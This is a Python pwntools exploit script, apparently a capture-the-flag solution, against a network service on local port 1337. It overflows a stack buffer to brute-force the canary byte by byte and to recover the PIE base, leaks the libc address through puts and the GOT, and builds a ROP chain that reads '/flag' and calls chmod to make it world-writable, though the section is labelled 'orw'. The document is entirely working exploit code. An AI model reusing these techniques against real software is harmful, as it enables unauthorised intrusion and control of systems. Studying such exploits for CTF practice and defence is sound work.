from pwn import *

canary = b'\x00'
### leak canary 
for i in range(7):
    guess = 1

    while True:
        b_guess = int.to_bytes(guess,1,'little')
        r = remote('0.0.0.0','1337')
        r.send(b'a'*0x48+canary+b_guess)
        r.recvuntil(b'Leaving!\n')
        a = r.recv(timeout=0.5)
        
        if b'smashing' not in a :
            canary += b_guess
            print(canary)
            r.close()
            break

        guess += 1 
        r.close()

canary = u64(canary)

guess = 0x02
pie = b'\x61'
for i in range(16):
    try :
        r = remote('0.0.0.0','1337')
        r.send(b'a'*0x48+p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
        r.recvuntil(b'Leaving!\n')
        a = r.recv(timeout=0.2)
        print(a)
    ## guess to challenge address
        if b'PIE is turned on' in a:
            pie += int.to_bytes(guess,1,'little')
            print(hex(guess))
            r.close()
            break
    except:
        guess += 0x10
        r.close()
        continue


for i in range(4):
    guess = 0x00
    while True:
        try :
            r = remote('0.0.0.0','1337')
            r.send(b'a'*0x48+p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
            r.recvuntil(b'Leaving!\n')
            a = r.recv(timeout=0.2)
            if b'PIE is turned on' in a:
                pie += int.to_bytes(guess,1,'little')
                print(pie)
                r.close()
                break
            raise error
        except:
            if guess == 0xff:
                print(f'program error')
                break    
            guess += 0x01
            r.close()
            continue

pie_base = u64(pie+b'\x00\x00')-0x2261
print(f'code base : {hex(pie_base)}')

### gadget
pop_rdi = pie_base + 0x22f3
puts = pie_base +0x11d0
puts_got = pie_base + 0x4f30

### leak libc base using puts(got)
r = remote('0.0.0.0','1337')
r.send(b'a'*0x48+p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts))
r.recvuntil(b'Leaving!\n')
libc = u64(r.recv(6)+b'\x00\x00') - 0x875a0
print(f'libc base : {hex(libc)}')
r.close()


### orw
pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
pop_rax = libc + 0x4a550
syscall = libc + 0x66229
buffer = pie_base + 0x5200


r = remote('0.0.0.0','1337')
payload = b'a'*0x48 + p64(canary) + p64(0)
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x20) + p64(0) + p64(syscall)
payload += p64(pop_rax) + p64(90) + p64(pop_rdi) + p64(buffer) + p64(pop_rsi) + p64(511) + p64(syscall)

r.send(payload)
r.send('/flag\x00\x00')
r.interactive()